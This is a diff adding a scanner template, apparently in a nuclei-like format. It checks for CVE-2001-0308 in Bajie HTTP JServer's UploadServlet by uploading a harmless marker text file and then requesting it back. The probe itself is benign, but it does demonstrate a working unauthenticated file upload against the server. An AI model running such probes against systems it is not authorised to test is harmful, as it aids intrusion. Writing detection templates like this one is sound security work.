@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "AVE-2001-0138 漏洞检测 PoC，通过向 Bajie HTTP JServer UploadServlet 发送文件上传 POST 请求并验证目录遍历访问，确认目标服务器是否存在代码注入漏洞。"
+id = "POC-AVE-2001-0138"
+name = "Bajie HTTP JServer UploadServlet 代码注入漏洞 PoC"
+severity = "high"
+tags = ["cve-2001-0308"]
+vuln_id = [
+    "CVE-2001-0308",
+    "AVE-2001-0138",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/servlet/UploadServlet"
+protocol = "http"
+
+[poc.requests.body]
+content = "filename=AVE-2001-0138-test.txt&content=AVE-2001-0138-marker"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["error"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/AVE-2001-0138-test.txt"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE-2001-0138-marker"]
